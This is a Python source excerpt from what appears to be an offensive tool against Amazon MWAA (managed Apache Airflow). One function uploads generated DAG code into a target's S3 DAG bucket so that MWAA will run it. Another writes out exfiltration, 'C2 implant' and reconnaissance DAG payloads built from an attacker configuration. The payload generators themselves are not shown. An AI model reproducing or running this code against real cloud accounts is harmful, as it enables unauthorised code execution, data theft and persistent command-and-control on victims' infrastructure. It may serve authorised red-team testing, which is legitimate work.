def upload_dag_to_s3(
    target: TargetConfig,
    dag_code: str,
    dag_filename: str,
) -> bool:
    """Upload a generated DAG to the target MWAA S3 bucket."""
    print_section("DAG Deployment")

    if not target.s3_dag_bucket:
        print_fail("No S3 DAG bucket specified in target config.")
        return False

    s3 = get_s3_client(target.region, target.profile)
    s3_key = f"{target.s3_dag_prefix}{dag_filename}"

    print_info(f"Bucket: {target.s3_dag_bucket}")
    print_info(f"Key:    {s3_key}")

    try:
        s3.put_object(
            Bucket=target.s3_dag_bucket,
            Key=s3_key,
            Body=dag_code.encode("utf-8"),
            ContentType="text/x-python",
        )
        print_success(f"DAG uploaded: s3://{target.s3_dag_bucket}/{s3_key}")
        print_info("MWAA will pick up the DAG on its next scan interval.")
        return True

    except Exception as e:
        print_fail(f"Upload failed: {e}")
        return False


def generate_all(
    attacker: AttackerConfig,
    output_dir: str,
    target_accounts: Optional[list] = None,
) -> list:
    """Generate all DAG payloads and write them to the output directory."""
    print_section("Generating All DAG Payloads")
    os.makedirs(output_dir, exist_ok=True)

    files = []

    # Exfiltration DAG
    path = os.path.join(output_dir, "dag_exfiltration.py")
    generate_exfiltration_dag(attacker, output_path=path)
    files.append(path)

    # C2 Implant DAG
    path = os.path.join(output_dir, "dag_c2_implant.py")
    generate_c2_implant_dag(attacker, output_path=path)
    files.append(path)

    # Recon DAG
    if target_accounts:
        path = os.path.join(output_dir, "dag_recon.py")
        generate_recon_dag(attacker, target_accounts, output_path=path)
        files.append(path)

    print_success(f"Generated {len(files)} DAG payload(s) in {output_dir}")
    return files
